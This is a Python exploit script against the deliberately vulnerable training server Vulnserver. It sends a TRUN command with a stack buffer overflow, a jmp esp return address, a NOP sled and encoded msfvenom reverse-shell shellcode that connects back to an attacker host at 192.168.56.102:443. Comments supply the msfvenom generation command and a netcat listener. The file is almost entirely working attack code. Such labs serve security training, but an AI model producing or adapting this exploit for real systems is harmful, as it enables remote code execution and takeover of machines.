'''
Vuln Server TRUN Exploit https://github.com/stephenbradshaw/vulnserver
Rayn Light 7/24/24
'''
import sys
import socket
import argparse


def exploit(ip, port):

	try:
		# Create your shellcode
		# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.102 LPORT=443 -b '\x00' -f python -e x86/shikata_ga_nai
		# encoder optional
		# nc -lvnp 443
		buf = b""
		buf += b"\xda\xd0\xd9\x74\x24\xf4\x5e\xbf\xd8\xda\x8a\x0e"
		buf += b"\x33\xc9\xb1\x52\x31\x7e\x17\x03\x7e\x17\x83\x36"
		buf += b"\x26\x68\xfb\x3a\x3f\xef\x04\xc2\xc0\x90\x8d\x27"
		buf += b"\xf1\x90\xea\x2c\xa2\x20\x78\x60\x4f\xca\x2c\x90"
		buf += b"\xc4\xbe\xf8\x97\x6d\x74\xdf\x96\x6e\x25\x23\xb9"
		buf += b"\xec\x34\x70\x19\xcc\xf6\x85\x58\x09\xea\x64\x08"
		buf += b"\xc2\x60\xda\xbc\x67\x3c\xe7\x37\x3b\xd0\x6f\xa4"
		buf += b"\x8c\xd3\x5e\x7b\x86\x8d\x40\x7a\x4b\xa6\xc8\x64"
		buf += b"\x88\x83\x83\x1f\x7a\x7f\x12\xc9\xb2\x80\xb9\x34"
		buf += b"\x7b\x73\xc3\x71\xbc\x6c\xb6\x8b\xbe\x11\xc1\x48"
		buf += b"\xbc\xcd\x44\x4a\x66\x85\xff\xb6\x96\x4a\x99\x3d"
		buf += b"\x94\x27\xed\x19\xb9\xb6\x22\x12\xc5\x33\xc5\xf4"
		buf += b"\x4f\x07\xe2\xd0\x14\xd3\x8b\x41\xf1\xb2\xb4\x91"
		buf += b"\x5a\x6a\x11\xda\x77\x7f\x28\x81\x1f\x4c\x01\x39"
		buf += b"\xe0\xda\x12\x4a\xd2\x45\x89\xc4\x5e\x0d\x17\x13"
		buf += b"\xa0\x24\xef\x8b\x5f\xc7\x10\x82\x9b\x93\x40\xbc"
		buf += b"\x0a\x9c\x0a\x3c\xb2\x49\x9c\x6c\x1c\x22\x5d\xdc"
		buf += b"\xdc\x92\x35\x36\xd3\xcd\x26\x39\x39\x66\xcc\xc0"
		buf += b"\xaa\x49\xb9\xf2\x4c\x22\xb8\x02\x90\x09\x35\xe4"
		buf += b"\xf8\x7d\x10\xbf\x94\xe4\x39\x4b\x04\xe8\x97\x36"
		buf += b"\x06\x62\x14\xc7\xc9\x83\x51\xdb\xbe\x63\x2c\x81"
		buf += b"\x69\x7b\x9a\xad\xf6\xee\x41\x2d\x70\x13\xde\x7a"
		buf += b"\xd5\xe5\x17\xee\xcb\x5c\x8e\x0c\x16\x38\xe9\x94"
		buf += b"\xcd\xf9\xf4\x15\x83\x46\xd3\x05\x5d\x46\x5f\x71"
		buf += b"\x31\x11\x09\x2f\xf7\xcb\xfb\x99\xa1\xa0\x55\x4d"
		buf += b"\x37\x8b\x65\x0b\x38\xc6\x13\xf3\x89\xbf\x65\x0c"
		buf += b"\x25\x28\x62\x75\x5b\xc8\x8d\xac\xdf\xf8\xc7\xec"
		buf += b"\x76\x91\x81\x65\xcb\xfc\x31\x50\x08\xf9\xb1\x50"
		buf += b"\xf1\xfe\xaa\x11\xf4\xbb\x6c\xca\x84\xd4\x18\xec"
		buf += b"\x3b\xd4\x08"
		buff_size = 2002
		NOP_SLED = b"\x90" * 60
		
		# Vulnerable essfunc.dll jmp esp, 0x625011af \xaf\x11\x50\x62
		# Exploit:
		payload = b"TRUN /:./ " + b"A" * buff_size + b"\xaf\x11\x50\x62" + NOP_SLED + buf
		
		# Connect to target
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip, port))

		#Send exploit & Payload
		s.send(payload)
		s.close()
		print("Check your netcat listener")
		sys.exit()

	except Exception as e:
		print(f"Error: {e}")
		sys.exit()

def main():
	parser = argparse.ArgumentParser(description="Kill vuln server")
	parser.add_argument('-i', '--ip', required=True, type=str, help='IP you are attacking')
	parser.add_argument('-p', '--port', required=True, type=int, help='Port you are attacking')
	args = parser.parse_args()
	ip = args.ip
	port = args.port
	exploit(ip, port)

if __name__ == '__main__':
    main()
